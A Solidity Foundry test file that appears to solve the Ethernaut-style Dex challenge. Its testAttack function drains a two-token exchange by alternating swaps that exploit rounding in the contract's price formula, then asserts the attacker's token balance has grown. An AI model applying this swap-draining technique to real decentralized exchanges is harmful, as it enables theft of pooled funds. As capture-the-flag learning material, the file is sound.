// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Dex.sol";

contract DexTest is Test {
    SwappableToken tokenA;
    SwappableToken tokenB;
    Dex dexContract;

    address A;
    address B;
    address dexAddress;

    address alice = address(0x1);

    function setUp() public {
        dexContract = new Dex();
        dexAddress = address(dexContract);

        tokenA = new SwappableToken(dexAddress, "TokenA", "A", 1000);
        tokenB = new SwappableToken(dexAddress, "TokenB", "B", 1000);

        tokenA.transfer(address(this), 10);
        tokenB.transfer(address(this), 10);

        tokenA.transfer(alice, 10);
        tokenB.transfer(alice, 10);

        A = address(tokenA);
        B = address(tokenB);

        dexContract.setTokens(A, B);
        dexContract.approve(dexAddress, 100);

        dexContract.addLiquidity(A, 100);
        dexContract.addLiquidity(B, 100);

        dexContract.renounceOwnership();
    }

    function testAttack() public {
        vm.startPrank(alice);
        dexContract.approve(dexAddress, 1e18);

        dexContract.swap(A, B, 10);
        dexContract.swap(B, A, 18);

        dexContract.swap(A, B, 22);
        dexContract.swap(B, A, 24);

        dexContract.swap(A, B, 20);
        dexContract.swap(B, A, 20);

        dexContract.swap(A, B, 34);
        dexContract.swap(B, A, 54);

        assert(tokenA.balanceOf(alice) > 100);
    }
}
